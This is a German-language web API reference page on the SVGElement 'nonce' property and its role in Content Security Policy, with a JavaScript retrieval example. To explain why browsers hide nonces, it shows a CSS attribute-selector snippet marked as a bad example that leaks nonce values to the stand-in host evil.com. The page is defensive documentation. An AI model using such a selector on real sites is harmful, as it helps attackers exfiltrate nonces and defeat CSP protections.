---
title: "SVGElement: `nonce`-Eigenschaft"
short-title: nonce
slug: Web/API/SVGElement/nonce
l10n:
  sourceCommit: 4d929bb0a021c7130d5a71a4bf505bcb8070378d
---

{{APIRef("SVG")}}

Die **`nonce`**-Eigenschaft der [`SVGElement`](/de/docs/Web/API/SVGElement)-Schnittstelle gibt den Nonce zurück, der von der [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP) verwendet wird, um zu bestimmen, ob ein bestimmter Abruf zulässig ist.

## Wert

Ein String; der kryptografische Nonce oder ein leerer String, wenn kein Nonce festgelegt ist.

## Beispiele

### Abruf eines Nonce-Wertes

In der Vergangenheit unterstützten nicht alle Browser das `nonce`-IDL-Attribut, daher bestand ein Workaround darin, [`getAttribute`](/de/docs/Web/API/Element/getAttribute) als Fallback zu verwenden:

```js
const svg = document.querySelector("svg");
const nonce = svg.nonce || svg.getAttribute("nonce");

// Modern browsers hide the nonce attribute from getAttribute()
console.log(nonce); // Prefer using `svg.nonce`
```

In jüngeren Browserversionen werden `nonce`-Werte, die auf diese Weise abgerufen werden, jedoch ausgeblendet (es wird ein leerer String zurückgegeben). Die IDL-Eigenschaft (`svg['nonce']`) wird die einzige Möglichkeit sein, auf Nonces zuzugreifen.

Das Ausblenden von Nonces hilft, Angreifer daran zu hindern, Nonce-Daten über Mechanismen wie diesen CSS-Selektor aus Inhalteeigenschaften zu exfiltrieren:

```css example-bad
svg[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce) eine ähnliche Methode für HTML-Elemente.
- [`nonce` globales Attribut](/de/docs/Web/HTML/Global_attributes/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: {{CSP("script-src")}}
